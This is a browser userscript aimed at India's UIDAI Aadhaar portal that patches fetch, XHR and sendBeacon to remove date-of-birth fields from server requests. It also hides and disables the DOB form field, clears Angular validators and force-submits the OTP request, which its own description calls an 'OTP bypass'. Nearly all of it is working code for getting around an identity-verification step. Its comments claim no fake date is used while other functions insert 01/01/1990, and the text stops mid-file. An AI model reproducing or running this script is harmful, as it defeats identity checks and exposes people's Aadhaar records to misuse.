// ==UserScript==
// @name         Rebel Adhar
// @namespace    https://github.com/ujjwalrebel53-wq/SpinPlay99
// @version      10.2.0
// @description  Rebel Adhar — server se DOB strip + OTP bypass (no fake date)
// @match        https://myaadhaar.uidai.gov.in/*
// @match        https://*.uidai.gov.in/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

/**
 * UIDAI Engine v10.2 — Server-side DOB strip + mode switch bypass
 */
(function (root, factory) {
  if (typeof module !== 'undefined' && module.exports) {
    module.exports = factory();
  } else {
    root.UidaiRetrieveEngine = factory();
  }
})(typeof globalThis !== 'undefined' ? globalThis : this, function () {
  const DISABLED_MARK = 'rebel-dob-disabled';
  const HIDDEN_MARK = 'rebel-dob-hidden';
  const DOB_LABEL = /date\s*of\s*birth|\bdob\b|birth\s*date|जन्म|जन्म\s*तिथि/i;
  const SILENT_DOB = '01/01/1990';
  const SILENT_DOB_ISO = '1990-01-01';

  let dobWatcher = null;
  let watchTimer = null;
  let bypassPoller = null;
  let syncingDom = false;
  const nativeInputSet = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')?.set;

  function norm(s) {
    return (s || '').replace(/\s+/g, ' ').trim().toLowerCase();
  }

  function qAll(sel) {
    const out = [];
    const seen = new Set();
    function scan(root) {
      if (!root?.querySelectorAll) return;
      root.querySelectorAll(sel).forEach((el) => {
        if (seen.has(el)) return;
        seen.add(el);
        out.push(el);
      });
      root.querySelectorAll('*').forEach((el) => {
        if (el.shadowRoot) scan(el.shadowRoot);
      });
    }
    scan(document);
    return out;
  }

  function isVisible(el, uiSel) {
    if (!el) return false;
    if (uiSel && el.closest(uiSel)) return false;
    const r = el.getBoundingClientRect();
    const s = getComputedStyle(el);
    return r.width > 0 && r.height > 0 && s.display !== 'none' && s.visibility !== 'hidden';
  }

  function isInDom(el, uiSel) {
    if (!el || !el.isConnected) return false;
    if (uiSel && el.closest(uiSel)) return false;
    let cur = el;
    while (cur && cur !== document.body) {
      const s = getComputedStyle(cur);
      if (s.display === 'none' || s.visibility === 'hidden') return false;
      cur = cur.parentElement;
    }
    return true;
  }

  function isLinkish(el) {
    if (!el) return false;
    const tag = (el.tagName || '').toLowerCase();
    if (tag === 'a' || tag === 'button') return true;
    if (el.getAttribute('role') === 'button' || el.getAttribute('role') === 'link') return true;
    if (el.closest?.('[matSuffix], [matsuffix], .mat-mdc-form-field-text-suffix')) return true;
    const st = getComputedStyle(el);
    return st.cursor === 'pointer' || st.textDecorationLine?.includes('underline');
  }

  function isFormLabel(el) {
    return !!el?.closest?.('mat-label, label, .mdc-floating-label, .mat-mdc-floating-label, legend');
  }

  function fieldContainer(el) {
    return (
      el?.closest(
        'mat-form-field, .mat-mdc-form-field, .mat-form-field-wrapper, .form-group, .mb-3, .mb-4, [class*="form-field"]'
      ) || el?.parentElement?.parentElement || el?.parentElement
    );
  }

  function labelTextFor(input, container) {
    const c = container || fieldContainer(input);
    const direct = c?.querySelector('mat-label, label, .mdc-floating-label, .mat-mdc-floating-label, legend');
    if (direct?.textContent) return norm(direct.textContent);
    return norm(input?.getAttribute('placeholder') || input?.getAttribute('aria-label') || '');
  }

  function isDobInput(input) {
    if (!input || input.type === 'hidden') return false;
    const blob = labelTextFor(input, fieldContainer(input));
    const ph = norm(input.placeholder || '');
    return (
      DOB_LABEL.test(blob) ||
      DOB_LABEL.test(ph) ||
      input.type === 'date' ||
      input.hasAttribute('matDatepicker') ||
      input.hasAttribute('matdatepicker') ||
      !!input.closest('mat-form-field')?.querySelector('mat-datepicker-toggle')
    );
  }

  function getDobInputs() {
    return qAll('input, textarea').filter(isDobInput);
  }

  function findDobBlocks() {
    const blocks = new Set();
    getDobInputs().forEach((input) => {
      const box = fieldContainer(input);
      if (box) blocks.add(box);
    });
    qAll('input[type="date"], input[type="datetime-local"]').forEach((input) => {
      const box = fieldContainer(input);
      if (box) blocks.add(box);
    });
    qAll('mat-form-field, .mat-mdc-form-field, .form-group, [class*="form-field"]').forEach((block) => {
      const blob = norm(block.textContent || '').slice(0, 120);
      if (DOB_LABEL.test(blob)) blocks.add(block);
    });
    qAll('mat-datepicker-toggle').forEach((t) => {
      const box = fieldContainer(t);
      if (box) blocks.add(box);
    });
    return Array.from(blocks);
  }

  function dobValuesFor(input) {
    const t = (input?.type || '').toLowerCase();
    if (t === 'date') return [SILENT_DOB_ISO];
    if (t === 'datetime-local') return [SILENT_DOB_ISO + 'T00:00'];
    return [SILENT_DOB, SILENT_DOB_ISO, '01-01-1990'];
  }

  function getMatFields() {
    const seen = new Set();
    const out = [];
    qAll('mat-form-field, .mat-mdc-form-field').forEach((mff) => {
      const input = mff.querySelector('input:not([type="hidden"]), textarea');
      if (!input || seen.has(input)) return;
      seen.add(input);
      const label = labelTextFor(input, mff);
      out.push({ mff, label, input });
    });
    qAll('input:not([type="hidden"]):not([type="radio"]):not([type="checkbox"])').forEach((input) => {
      if (seen.has(input)) return;
      seen.add(input);
      out.push({ mff: fieldContainer(input), label: labelTextFor(input), input });
    });
    return out;
  }

  function classifyField(f) {
    const l = f.label;
    if (DOB_LABEL.test(l) || isDobInput(f.input)) return 'dob';
    if (/^or\s/.test(l)) return 'toggle';
    if ((/enter\s*e-?mail/.test(l) || f.input.type === 'email') && !/mobile/.test(l)) return 'email';
    if (/mobile|phone|मोबाइल/.test(l) && !/email/.test(l)) return 'mobile';
    if (/name|नाम/.test(l)) return 'name';
    if (/captcha/.test(l)) return 'captcha';
    return 'other';
  }

  function injectCss() {
    if (document.getElementById('rebel-engine-css')) return;
    const st = document.createElement('style');
    st.id = 'rebel-engine-css';
    st.textContent =
      '.' +
      HIDDEN_MARK +
      ',.rebel-email-hidden{display:none!important;visibility:hidden!important;height:0!important;overflow:hidden!important;margin:0!important;padding:0!important;}' +
      '.' +
      DISABLED_MARK +
      '{opacity:.55!important;pointer-events:none!important;user-select:none!important;}' +
      '.' +
      DISABLED_MARK +
      ' input,.' +
      DISABLED_MARK +
      ' button,.' +
      DISABLED_MARK +
      ' mat-datepicker-toggle{cursor:not-allowed!important;pointer-events:none!important;background:#f3f4f6!important;}';
    (document.head || document.documentElement).appendChild(st);
  }

  /** DOB field screen se hat jaye */
  function hideBlocks(blocks, cssClass, dataAttr, log, msg) {
    injectCss();
    blocks.forEach((block) => {
      block.classList.add(cssClass);
      block.setAttribute(dataAttr, '1');
      block.style.setProperty('display', 'none', 'important');
    });
    if (blocks.length) log?.('info', msg, { blocks: blocks.length });
    return blocks.length;
  }

  function hideDob(uiSel, log) {
    return hideBlocks(findDobBlocks(), HIDDEN_MARK, 'data-rebel-dob-hidden', log, 'DOB hidden (bypass)');
  }

  function findEmailBlocks() {
    const blocks = new Set();
    getMatFields().forEach((f) => {
      if (classifyField(f) !== 'email') return;
      if (f.mff) blocks.add(f.mff);
    });
    return Array.from(blocks);
  }

  function hideEmail(uiSel, log) {
    return hideBlocks(findEmailBlocks(), 'rebel-email-hidden', 'data-rebel-email-hidden', log, 'Email hidden (mobile mode)');
  }

  function isEmailNeutralized(input) {
    return input?.dataset?.rebelEmailOff === '1' || !!input?.closest?.('[data-rebel-email-hidden]');
  }

  /** Angular email empty block karta hai — disable + validators clear */
  function isDobPayloadKey(key) {
    const k = String(key || '');
    if (!k) return false;
    if (isDobControlKey(k)) return true;
    if (/^(dob|dateofbirth|date_of_birth|dateOfBirth|birthDate|birth_date|birthDt|dtbirth|userdob|dobstr|dobdate|dateOfBirthStr)$/i.test(k))
      return true;
    if (/\bdob\b/i.test(k)) return true;
    if (/birth/i.test(k) && /date|dt|day/i.test(k)) return true;
    return false;
  }

  function stripDobDeep(val, depth, removed) {
    const rm = removed || [];
    if (val == null || depth > 14) return val;
    if (typeof val === 'string') {
      const t = val.trim();
      if ((t.startsWith('{') && t.endsWith('}')) || (t.startsWith('[') && t.endsWith(']'))) {
        try {
          const parsed = stripDobDeep(JSON.parse(t), depth + 1, rm);
          return JSON.stringify(parsed);
        } catch (_e) {}
      }
      if (t.includes('=') && /dob|birth|dateofbirth/i.test(t)) {
        const kept = [];
        t.split('&').forEach((p) => {
          const k = decodeURIComponent((p.split('=')[0] || '')).trim();
          if (isDobPayloadKey(k)) rm.push(k);
          else kept.push(p);
        });
        return kept.join('&');
      }
      return val;
    }
    if (val instanceof URLSearchParams) {
      const out = new URLSearchParams();
      val.forEach((v, k) => {
        if (isDobPayloadKey(k)) rm.push(k);
        else out.append(k, v);
      });
      return out;
    }
    if (val instanceof FormData) {
      const fd = new FormData();
      val.forEach((v, k) => {
        if (isDobPayloadKey(k)) rm.push(k);
        else fd.append(k, v);
      });
      return fd;
    }
    if (Array.isArray(val)) return val.map((x) => stripDobDeep(x, depth + 1, rm));
    if (typeof val === 'object') {
      const out = {};
      Object.entries(val).forEach(([k, v]) => {
        if (isDobPayloadKey(k)) {
          rm.push(k);
          return;
        }
        out[k] = stripDobDeep(v, depth + 1, rm);
      });
      return out;
    }
    return val;
  }

  function stripDobFromBody(body) {
    const removed = [];
    const stripped = stripDobDeep(body, 0, removed);
    return { body: stripped, removed: [...new Set(removed)] };
  }

  function isRetrieveOtpUrl(url) {
    const u = String(url || '');
    return /otp|retrieve|send|generate|aadhaar|uidai|myaadhaar|auth|verify|validate|submit|gov\.in/i.test(u);
  }

  function shouldStripServerPost(url) {
    const u = String(url || '');
    if (isRetrieveOtpUrl(u)) return true;
    if (/^\//.test(u) && /myaadhaar|uidai|retrieve|otp|aadhaar/i.test(location.pathname + location.host)) return true;
    if (/uidai\.gov\.in|myaadhaar/i.test(u)) return true;
    if (/uidai|myaadhaar|gov\.in/i.test(location.hostname) && (u === '' || /^\//.test(u))) return true;
    return false;
  }

  function installNetworkBypass(hooks) {
    if (window.__rebelNetBypass11) return;
    window.__rebelNetBypass11 = true;
    const log = hooks?.log;
    const enabled = hooks?.enabled || (() => true);
    const onHit = hooks?.onHit || (() => {});

    function processPost(url, method, body) {
      if (!enabled() || String(method).toUpperCase() !== 'POST' || body == null) return { body, removed: [] };
      if (!shouldStripServerPost(url)) return { body, removed: [] };
      const { body: stripped, removed } = stripDobFromBody(body);
      if (removed.length) {
        log?.('info', 'Server request se DOB hata di', {
          url: String(url || '').slice(0, 100),
          removed,
        });
      }
      return { body: stripped, removed };
    }

    const origFetch = window.fetch;
    if (origFetch) {
      window.fetch = function (input, init) {
        if (input instanceof Request && (!init || init.body === undefined)) {
          const req = input;
          const method = String(req.method || 'GET').toUpperCase();
          const url = req.url || '';
          if (enabled() && method === 'POST' && shouldStripServerPost(url)) {
            return req.text().then((text) => {
              const { body, removed } = processPost(url, method, text);
              onHit('fetch', method, url);
              const headers = new Headers(req.headers);
              if (removed.length) log?.('info', 'fetch POST stripped', { removed });
              return origFetch.call(window, url, {
                method: req.method,
                headers,
                body,
                credentials: req.credentials,
                mode: req.mode,
                cache: req.cache,
                redirect: req.redirect,
                referrer: req.referrer,
                integrity: req.integrity,
              });
            });
          }
          if (enabled() && (shouldStripServerPost(url) || method === 'POST')) onHit('fetch', method, url);
          return origFetch.call(this, input, init);
        }

        const opts = init ? Object.assign({}, init) : {};
        const url = typeof input === 'string' ? input : input?.url || '';
        const method = String(opts.method || (input instanceof Request ? input.method : 'GET')).toUpperCase();
        if (opts.body != null) {
          const r = processPost(url, method, opts.body);
          opts.body = r.body;
        }
        if (enabled() && (shouldStripServerPost(url) || method === 'POST')) onHit('fetch', method, url);
        return origFetch.call(this, input, opts);
      };
    }

    const XHR = window.XMLHttpRequest?.prototype;
    if (XHR) {
      const origOpen = XHR.open;
      const origSend = XHR.send;
      const origSetHeader = XHR.setRequestHeader;
      XHR.open = function (method, url) {
        this.__rebelMethod = String(method || 'GET').toUpperCase();
        this.__rebelUrl = String(url || '');
        this.__rebelHeaders = {};
        return origOpen.apply(this, arguments);
      };
      XHR.setRequestHeader = function (name, value) {
        if (!this.__rebelHeaders) this.__rebelHeaders = {};
        this.__rebelHeaders[name] = value;
        return origSetHeader.apply(this, arguments);
      };
      XHR.send = function (body) {
        const url = this.__rebelUrl || '';
        const method = this.__rebelMethod || 'GET';
        if (body != null) {
          const r = processPost(url, method, body);
          body = r.body;
        }
        if (enabled() && (shouldStripServerPost(url) || method === 'POST')) onHit('xhr', method, url);
        return origSend.call(this, body);
      };
    }

    if (navigator.sendBeacon) {
      const origBeacon = navigator.sendBeacon.bind(navigator);
      navigator.sendBeacon = function (url, data) {
        const r = processPost(url, 'POST', data);
        return origBeacon(url, r.body);
      };
    }
  }

  /** DOB values EMPTY — fake date KABHI NAHI */
  function clearDobValuesOnly(log) {
    let n = 0;
    syncingDom = true;
    getDobInputs().forEach((input) => {
      delete input.dataset.rebelDobOk;
      delete input.dataset.rebelDobFail;
      input.dataset.rebelDobTry = '0';
      if (nativeInputSet) nativeInputSet.call(input, '');
      else input.value = '';
      try {
        input.valueAsDate = null;
      } catch (_e) {}
      input.dispatchEvent(new Event('input', { bubbles: true }));
      input.dispatchEvent(new Event('change', { bubbles: true }));
      n += 1;
    });
    syncingDom = false;
    collectFormGroups().forEach((form) => {
      const walk = (group) => {
        Object.entries(group.controls || {}).forEach(([key, ctrl]) => {
          if (isFormGroup(ctrl)) walk(ctrl);
          else if (isDobControlKey(key)) {
            ctrl.clearValidators?.();
            ctrl.setErrors?.(null);
            try {
              ctrl.setValue(null, { emitEvent: false });
            } catch (_e1) {
              try {
                ctrl.setValue('', { emitEvent: false });
              } catch (_e2) {}
            }
            try {
              ctrl.disable({ emitEvent: false });
            } catch (_e3) {}
          }
        });
      };
      walk(form);
      form.updateValueAndValidity?.({ emitEvent: false });
    });
    if (n) log?.('info', 'DOB cleared (empty, no fake date)', { inputs: n });
    return n;
  }

  /** DOB ko form se hatao — validators clear, hide, NO fake date */
  function neutralizeDobControls(uiSel, log) {
    injectCss();
    clearDobValuesOnly(log);
    let n = 0;
    findDobBlocks().forEach((block) => {
      disableDobDom(block);
      block.classList.add(HIDDEN_MARK);
      block.setAttribute('data-rebel-dob-hidden', '1');
      block.style.setProperty('display', 'none', 'important');
      n += 1;
    });
    getDobInputs().forEach((input) => {
      input.disabled = true;
      input.removeAttribute('required');
      input.setAttribute('aria-required', 'false');
      input.setCustomValidity?.('');
      input.removeAttribute('name');
      input.removeAttribute('formcontrolname');
      input.dataset.rebelDobOff = '1';
      const box = fieldContainer(input);
      if (box) {
        box.classList.add(HIDDEN_MARK);
        box.setAttribute('data-rebel-dob-hidden', '1');
        box.style.setProperty('display', 'none', 'important');
      }
      n += 1;
    });
    if (n) log?.('info', 'DOB form logic neutralized', { count: n });
    return n;
  }

  let lastModeClickAt = 0;

  function advancedBypass(uiSel, log) {
    const now = Date.now();
    if (!isDobBypassed(uiSel) && now - lastModeClickAt > 2000) {
      const links = discoverOrLinks(uiSel);
      const email = links.find((l) => l.kind === 'email');
      const mobile = links.find((l) => l.kind === 'mobile');
      if (email) {
        simulateClick(email.el);
        lastModeClickAt = now;
        log?.('info', 'Mode click', email.text);
      } else if (mobile) {
        simulateClick(mobile.el);
        lastModeClickAt = now;
        log?.('info', 'Mode click', mobile.text);
      }
    }
    if (!isDobBypassed(uiSel)) neutralizeDobControls(uiSel, log);
    if (isDobBypassed(uiSel)) neutralizeEmail(log);
    enableOtpButtons();
    return {
      dobBypassed: isDobBypassed(uiSel),
      dobVisible: dobFieldVisible(uiSel),
      orLinks: discoverOrLinks(uiSel).map((l) => l.text),
    };
  }

  function forceSubmitOtp(btn, log) {
    if (!btn) return false;
    enableOtpButtons();
    btn.disabled = false;
    btn.removeAttribute('disabled');
    btn.classList?.remove('mat-button-disabled', 'mat-mdc-button-disabled', 'disabled');
    btn.style.pointerEvents = 'auto';
    const form = btn.closest('form');
    if (form?.requestSubmit) {
      try {
        form.requestSubmit(btn);
        log?.('info', 'OTP force — form.requestSubmit');
        return true;
      } catch (_e) {}
    }
    simulateClick(btn);
    log?.('info', 'OTP force — button click');
    return true;
  }

  function neutralizeEmail(log) {
    let n = 0;
    getMatFields().forEach((f) => {
      if (classifyField(f) !== 'email') return;
      const input = f.input;
      input.disabled = true;
      input.removeAttribute('required');
      input.setAttribute('aria-required', 'false');
      input.setCustomValidity?.('');
      input.dataset.rebelEmailOff = '1';
      n += 1;
    });
    collectFormGroups().forEach((form) => {
      if (!form.controls) return;
      Object.entries(form.controls).forEach(([key, ctrl]) => {
        if (!/email/i.test(key)) return;
        ctrl.clearValidators?.();
        ctrl.setErrors?.(null);
        try {
          ctrl.disable({ emitEvent: false });
        } catch (_e) {}
      });
      form.updateValueAndValidity?.({ emitEvent: false });
    });
    hideEmail(null, log);
    if (n) log?.('info', 'Email neutralized', { count: n });
    return n;
  }

  /** Bypass = DOB screen/form se hat gaya (DOM me ho sakta hai par UIDAI ne hide/remove kiya) */
  function isDobInputActive(input, uiSel) {
    if (!input || input.type === 'hidden') return false;
    if (input.dataset?.rebelDobOff === '1') return false;
    if (input.closest('[data-rebel-dob-hidden],[data-rebel-dob-off]')) return false;
    const box = fieldContainer(input);
    if (box) {
      if (box.hidden || box.getAttribute('aria-hidden') === 'true') return false;
      const bs = getComputedStyle(box);
      if (bs.display === 'none' || bs.visibility === 'hidden' || parseFloat(bs.opacity) === 0) return false;
      const br = box.getBoundingClientRect();
      if (br.width < 1 || br.height < 1) return false;
    }
    return isVisible(input, uiSel);
  }

  function isDobBypassed(uiSel) {
    const inputs = getDobInputs();
    if (!inputs.length) return true;
    return !inputs.some((i) => isDobInputActive(i, uiSel));
  }

  /** OR Email → OR Mobile (ya sirf OR Mobile) — UIDAI native mode switch */
  function quickModeSwitch(uiSel, log) {
    const links = discoverOrLinks(uiSel);
    const email = links.find((l) => l.kind === 'email');
    const mobile = links.find((l) => l.kind === 'mobile');
    if (email) {
      log?.('info', 'Mode click', email.text);
      simulateClick(email.el);
    }
    if (mobile) {
      log?.('info', 'Mode click', mobile.text);
      simulateClick(mobile.el);
    } else if (!email && links[0]) {
      log?.('info', 'Mode click', links[0].text);
      simulateClick(links[0].el);
    }
    return { email: !!email, mobile: !!mobile, found: links.length };
  }

  function ensureMobileModeSync(uiSel, log) {
    if (getDobInputs().length) quickModeSwitch(uiSel, log);
    const mobile = findOrMobileLink(uiSel);
    if (mobile && isVisible(mobile, uiSel)) simulateClick(mobile);
    return neutralizeEmail(log) > 0 || !!mobile;
  }

  function walkNg(el, fn) {
    const ctx = el?.__ngContext__;
    if (!Array.isArray(ctx)) return;
    ctx.forEach((item) => fn(item, el));
  }

  function readInputVal(input) {
    if (!input) return '';
    const v = input.value || input.getAttribute('value') || '';
    return String(v).trim();
  }

  function getComponentFromElement(el) {
    if (!el) return null;
    if (typeof window.ng?.getComponent === 'function') {
      try {
        return window.ng.getComponent(el);
      } catch (_e) {}
    }
    const ctx = el.__ngContext__;
    if (!Array.isArray(ctx)) return null;
    const tView = ctx[1];
    if (tView?.components?.length) {
      for (const idx of tView.components) {
        const lView = ctx[idx];
        if (Array.isArray(lView) && lView[8] && lView[0] === el) return lView[8];
      }
    }
    for (let i = 0; i < ctx.length; i++) {
      const item = ctx[i];
      if (item?.form?.controls) return item;
      if (item?.controls && item.updateValueAndValidity) return item;
    }
    return null;
  }

  function deepScanObject(root, found, seen, depth) {
    if (!root || depth > 10 || typeof root !== 'object' || seen.has(root)) return;
    seen.add(root);
    if (isFormGroup(root) && !found.includes(root)) found.push(root);
    if (root.control?.setValue && root.name && isDobControlKey(root.name)) {
      found.push({ ctrl: root.control, key: root.name, ngControl: true });
    }
    if (Array.isArray(root)) {
      root.forEach((x) => deepScanObject(x, found, seen, depth + 1));
      return;
    }
    try {
      Object.values(root).forEach((x) => deepScanObject(x, found, seen, depth + 1));
    } catch (_e) {}
  }

  function isDobControlKey(key) {
    return /dob|birth|dateofbirth|date_of_birth|dateOfBirth/i.test(key || '');
  }

  function isFormGroup(obj) {
    return obj && typeof obj === 'object' && obj.controls && typeof obj.updateValueAndValidity === 'function';
  }

  function walkAllNg(fn) {
    const seen = new WeakSet();
    qAll('*').forEach((el) => {
      walkNg(el, (item) => {
        if (!item || typeof item !== 'object' || seen.has(item)) return;
        seen.add(item);
        fn(item, el);
      });
    });
  }

  function collectFormGroups() {
    const groups = [];
    const seen = new WeakSet();
    const scanSeen = new WeakSet();

    walkAllNg((item) => {
      [item, item?.form].forEach((form) => {
        if (!isFormGroup(form) || seen.has(form)) return;
        seen.add(form);
        groups.push(form);
      });
    });

    qAll('*').forEach((el) => {
      const ctx = el.__ngContext__;
      if (Array.isArray(ctx)) deepScanObject(ctx, groups, scanSeen, 0);
    });

    getDobInputs().forEach((input) => {
      let el = input;
      for (let i = 0; i < 12 && el; i++, el = el.parentElement) {
        const cmp = getComponentFromElement(el);
        [cmp, cmp?.form, cmp?.retrieveForm, cmp?.aadhaarForm, cmp?.formGroup].forEach((form) => {
          if (!isFormGroup(form) || seen.has(form)) return;
          seen.add(form);
          groups.push(form);
        });
      }
    });

    return groups;
  }

  function collectNgControls() {
    const out = [];
    const seen = new WeakSet();
    getDobInputs().forEach((input) => {
      let el = input;
      for (let i = 0; i < 12 && el; i++, el = el.parentElement) {
        walkNg(el, (item) => {
          if (item?.control?.setValue && !seen.has(item.control)) {
            seen.add(item.control);
            out.push({ ctrl: item.control, key: item.name || item._parent?.name || 'dob', el: input });
          }
        });
        if (Array.isArray(el.__ngContext__)) {
          const scanSeen = new WeakSet();
          deepScanObject(el.__ngContext__, out, scanSeen, 0);
        }
      }
    });
    return out;
  }

  function dobControlEmpty(ctrl) {
    const v = ctrl?.value;
    return v == null || v === '' || (typeof v === 'string' && !v.trim());
  }

  const DOB_VALUES = [SILENT_DOB_ISO, new Date(1990, 0, 1), SILENT_DOB, '01-01-1990'];

  function patchDobControl(ctrl, key, log) {
    if (!ctrl?.setValue && !ctrl?.patchValue) return false;
    if (key && !isDobControlKey(key) && key !== 'dob') return false;
    try {
      if (ctrl.disabled) ctrl.enable({ emitEvent: false });
    } catch (_e) {}
    ctrl.clearValidators?.();
    ctrl.setErrors?.(null);
    if (dobControlEmpty(ctrl)) {
      for (const val of DOB_VALUES) {
        try {
          ctrl.setValue(val, { emitEvent: true });
          if (!dobControlEmpty(ctrl)) break;
        } catch (_e1) {
          try {
            ctrl.patchValue(val, { emitEvent: true });
            if (!dobControlEmpty(ctrl)) break;
          } catch (_e2) {}
        }
      }
    }
    ctrl.markAsDirty?.();
    ctrl.markAsTouched?.();
    ctrl.updateValueAndValidity?.({ emitEvent: true });
    log?.('info', 'Angular DOB patch', { key: key || 'ctrl', val: String(ctrl.value).slice(0, 14) });
    return true;
  }

  function setDobOnInput(input, log) {
    if (!input) return false;
    if (input.dataset.rebelDobFail === '1') return false;
    if (input.dataset.rebelDobOk === '1' && readInputVal(input)) return true;

    const tries = parseInt(input.dataset.rebelDobTry || '0', 10);
    if (tries >= 4) {
      input.dataset.rebelDobFail = '1';
      return false;
    }
    input.dataset.rebelDobTry = String(tries + 1);

    syncingDom = true;
    const wasReadonly = input.hasAttribute('readonly');
    const wasDisabled = input.disabled;
    input.removeAttribute('readonly');
    input.disabled = false;
    input.removeAttribute('disabled');

    if (input.type === 'date' || input.type === 'datetime-local') {
      try {
        input.valueAsDate = new Date(1990, 0, 1);
      } catch (_e) {}
    }

    for (const val of dobValuesFor(input)) {
      if (nativeInputSet) nativeInputSet.call(input, val);
      else input.value = val;
      input.dispatchEvent(new Event('input', { bubbles: true }));
      input.dispatchEvent(new Event('change', { bubbles: true }));
      if (readInputVal(input)) break;
    }
    input.dispatchEvent(new Event('blur', { bubbles: true }));

    if (wasReadonly) input.setAttribute('readonly', '');
    if (wasDisabled) {
      input.disabled = true;
      input.setAttribute('disabled', 'true');
    }

    const ok = !!readInputVal(input);
    if (ok) input.dataset.rebelDobOk = '1';
    else
      log?.('warn', 'DOB input reject', {
        ro: wasReadonly,
        dis: wasDisabled,
        type: input.type,
        tried: dobValuesFor(input),
      });
    syncingDom = false;
    return ok;
  }

  function syncDobDom(log) {
    if (syncingDom) return 0;
    let n = 0;
    let ok = 0;
    findDobBlocks().forEach((block) => {
      block.querySelectorAll('input, textarea').forEach((input) => {
        if (readInputVal(input)) return;
        n += 1;
        if (setDobOnInput(input, log)) ok += 1;
      });
    });
    getDobInputs().forEach((input) => {
      if (readInputVal(input)) return;
      n += 1;
      if (setDobOnInput(input, log)) ok += 1;
    });
    if (n) log?.('info', 'DOB DOM sync', { tried: n, ok, iso: SILENT_DOB_ISO });
    return ok;
  }

  function patchAllDobControls(log) {
    let patched = 0;
    collectNgControls().forEach((item) => {
      const ctrl = item.ctrl || item;
      const key = item.key || 'dob';
      if (ctrl?.setValue && patchDobControl(ctrl, key, log)) patched += 1;
    });
    return patched;
  }

  /** OTP fix: Angular form VALID + hidden DOB filled silently */
  function patchAngularForms(log) {
    let patched = 0;
    const forms = [];
    collectFormGroups().forEach((form) => {
      if (!form.controls) return;
      const before = form.status;
      const walk = (group) => {
        Object.entries(group.controls || {}).forEach(([key, ctrl]) => {
          if (isFormGroup(ctrl)) walk(ctrl);
          else if (isDobControlKey(key) && patchDobControl(ctrl, key, log)) patched += 1;
        });
      };
      walk(form);
      if (patched === 0) {
        Object.entries(form.controls).forEach(([key, ctrl]) => {
          if (!isFormGroup(ctrl) && dobControlEmpty(ctrl) && patchDobControl(ctrl, key, log)) patched += 1;
        });
      }
      form.updateValueAndValidity?.({ emitEvent: true });
      forms.push({ before, after: form.status, valid: !!form.valid });
    });
    patched += patchAllDobControls(log);
    const dom = syncDobDom(log);
    return { patched, dom, forms, ngControls: collectNgControls().length };
  }

  function getFieldSnapshot(uiSel) {
    return getMatFields()
      .filter((f) => {
        const t = classifyField(f);
        if (t === 'dob' || t === 'toggle') return false;
        if (t === 'email' && isEmailNeutralized(f.input)) return false;
        return true;
      })
      .map((f) => ({
        type: classifyField(f),
        label: f.label.slice(0, 28),
        val: readInputVal(f.input).slice(0, 20),
        ok: !!readInputVal(f.input),
      }));
  }

  function isFormReadyForOtp(uiSel) {
    if (!isDobBypassed(uiSel)) return false;
    const snap = getFieldSnapshot(uiSel);
    const mobile = snap.find((f) => f.type === 'mobile');
    const captcha = snap.find((f) => f.type === 'captcha');
    return !!(mobile?.ok && captcha?.ok);
  }

  function getFormDiagnostics(uiSel) {
    const groups = collectFormGroups().filter((g) => g.controls);
    const sample = getDobInputs()[0];
    return {
      formCount: groups.length,
      ngControls: collectNgControls().length,
      invalid: groups.filter((g) => g.status === 'INVALID').length,
      statuses: groups.slice(0, 5).map((g) => g.status),
      ngCtxType: sample ? typeof sample.__ngContext__ : 'none',
      dobBypassed: isDobBypassed(uiSel),
      dobInForm: getDobInputs().length,
      dobVisible: dobFieldVisible(uiSel),
      fields: getFieldSnapshot(uiSel),
      dobInputs: getDobInputs().map((i) => ({
        val: readInputVal(i).slice(0, 14),
        type: i.type || '',
        hidden: !!i.closest('[data-rebel-dob-hidden]'),
        ro: i.hasAttribute('readonly'),
        ok: i.dataset.rebelDobOk === '1',
      })),
      orLinks: discoverOrLinks(uiSel).map((l) => l.text),
    };
  }

  function disableDobDom(block) {
    if (!block) return;
    block.classList.add(DISABLED_MARK);
    block.setAttribute('data-rebel-dob-off', '1');
    block.querySelectorAll('input, textarea, button, mat-datepicker-toggle, [role="button"]').forEach((el) => {
      el.disabled = true;
      el.setAttribute('disabled', 'true');
      el.setAttribute('aria-disabled', 'true');
      el.removeAttribute('required');
      el.setCustomValidity?.('');
    });
  }

  /** DOB bypass — user ko DOB fill nahi karna */
  function disableDob(uiSel, log) {
    injectCss();
    const blocks = findDobBlocks();
    blocks.forEach(disableDobDom);
    getDobInputs().forEach((input) => {
      input.disabled = true;
      input.setAttribute('disabled', 'true');
      input.removeAttribute('required');
      input.setAttribute('aria-required', 'false');
      input.setCustomValidity('');
      const box = fieldContainer(input);
      if (box) disableDobDom(box);
    });
    clearDobValuesOnly(log);
    log?.('info', 'DOB bypass applied', { blocks: blocks.length, inputs: getDobInputs().length });
    return { blocks: blocks.length };
  }

  function isDobHidden(uiSel) {
    const inputs = getDobInputs();
    if (!inputs.length) return true;
    return !inputs.some((i) => isVisible(i, uiSel) && !i.closest('[data-rebel-dob-hidden],[data-rebel-dob-off]'));
  }

  function isDobDisabled(uiSel) {
    if (isDobHidden(uiSel)) return true;
    const inputs = getDobInputs();
    if (!inputs.length) return true;
    return inputs.every((i) => i.disabled || i.closest('[data-rebel-dob-off],[data-rebel-dob-hidden]'));
  }

  function leafClickable(el) {
    if (!el) return null;
    let cur = el;
    while (cur && cur !== document.body) {
      const tag = (cur.tagName || '').toLowerCase();
      if (tag === 'a' || tag === 'button') return cur;
      if (cur.getAttribute('role') === 'button' || cur.getAttribute('role') === 'link') return cur;
      if (cur.onclick || cur.getAttribute('ng-reflect-router-link')) return cur;
      if (cur.classList?.contains('uidai-or-link') || cur.classList?.contains('or-link')) return cur;
      const blob = norm(cur.textContent || '');
      if (blob.length < 55 && isOrLinkText(blob)) {
        const st = getComputedStyle(cur);
        if (st.cursor === 'pointer' || st.textDecorationLine?.includes('underline') || tag === 'span') return cur;
      }
      cur = cur.parentElement;
    }
    return el;
  }

  function isOrLinkText(text) {
    const t = norm(text);
    if (t.length < 5 || t.length > 60) return false;
    if (!/\bor\b/.test(t)) return false;
    if (/date of birth|enter captcha|enter name|जन्म/i.test(t)) return false;
    if ((t.match(/\benter\b/g) || []).length > 2) return false;
    if (/mobile|phone|मोबाइल/i.test(t) && /e-?mail|email/i.test(t) && t.length > 34) return false;
    return (
      /\bor\s*(enter\s*)?(e-?mail|email)(\s*(address|id|no\.?))?\b/i.test(t) ||
      /\bor\s*(enter\s*)?(mobile|phone)(\s*(number|no\.?))?\b/i.test(t) ||
      /\bor\s*(e-?mail|mobile|phone)\b/i.test(t)
    );
  }

